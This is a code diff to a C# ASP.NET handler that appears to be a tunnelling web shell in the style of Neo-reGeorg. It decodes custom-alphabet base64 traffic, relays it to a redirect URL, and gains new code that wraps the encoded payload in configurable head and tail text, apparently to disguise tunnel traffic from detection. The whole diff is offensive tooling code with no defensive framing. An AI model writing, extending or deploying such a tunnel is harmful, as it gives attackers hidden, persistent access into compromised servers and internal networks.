@@ -117,11 +117,22 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
 
         String en = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
         String de = "BASE64 CHARSLIST";
+
+        String requestDataHead = "";
+        String requestDataTail = "";
         
         if (context.Request.ContentLength != -1) {
             byte[] buff = new byte[context.Request.ContentLength];
             context.Request.InputStream.Read(buff, 0, buff.Length);
-            string b64 = StrTr(Encoding.Default.GetString(buff), de, en);
+            String inputData = Encoding.Default.GetString(buff);
+            if (USE_REQUEST_TEMPLATE == 1 && inputData.Length > 0) {
+                requestDataHead = inputData.Substring(0, START_INDEX);
+                requestDataTail = inputData.Substring(inputData.Length - END_INDEX, END_INDEX);
+
+                inputData = inputData.Substring(START_INDEX);
+                inputData = inputData.Substring(0, inputData.Length - END_INDEX);
+            }
+            string b64 = StrTr(inputData, de, en);
             byte[] data = Convert.FromBase64String(b64);
             info = blv_decode(data);
         }
@@ -141,7 +152,7 @@ public class GenericHandler1 : IHttpHandler, System.Web.SessionState.IRequiresSe
             try{
                 Stream body = request.GetRequestStream();
                 info[REDIRECTURL] = null;
-                byte[] data = Encoding.Default.GetBytes(StrTr(Convert.ToBase64String(blv_encode(info)), en, de));
+                byte[] data = Encoding.Default.GetBytes( requestDataHead + StrTr(Convert.ToBase64String(blv_encode(info)), en, de) + requestDataTail );
                 body.Write(data, 0, data.Length);
                 body.Close();
             } catch (Exception e){}
